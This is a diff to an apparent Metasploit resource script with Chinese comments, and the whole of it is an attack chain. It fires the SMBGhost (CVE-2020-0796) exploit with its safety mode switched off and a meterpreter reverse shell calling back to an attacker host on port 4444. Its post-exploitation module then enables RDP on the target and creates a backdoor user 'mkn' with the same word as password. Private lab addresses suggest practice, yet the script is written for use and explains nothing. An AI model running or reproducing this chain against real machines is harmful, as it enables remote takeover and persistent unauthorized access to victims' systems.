@@ -1,5 +1,16 @@
+# 基于smb 协议进入win10后，设置一个远程rdp服务和用户
 use exploit/windows/smb/cve_2020_0796_smbghost
-set payload windows/x64/shell/reverse_tcp
-set DefangedMode false
-set RHOSTS 192.168.1.105
+set payload windows/x64/meterpreter/reverse_tcp
+set DefangedMode false 
+set RHOSTS 192.168.1.3
+set RPORT 445
+set LHOST 192.168.1.53
+set LPORT 4444
+run
+# 利用命令background设置后台保存成session
+# 设置一个远程rdp服务和用户
+use post/windows/manage/enable_rdp
+set USERNAME mkn
+set PASSWORD mkn
+set session 1
 run
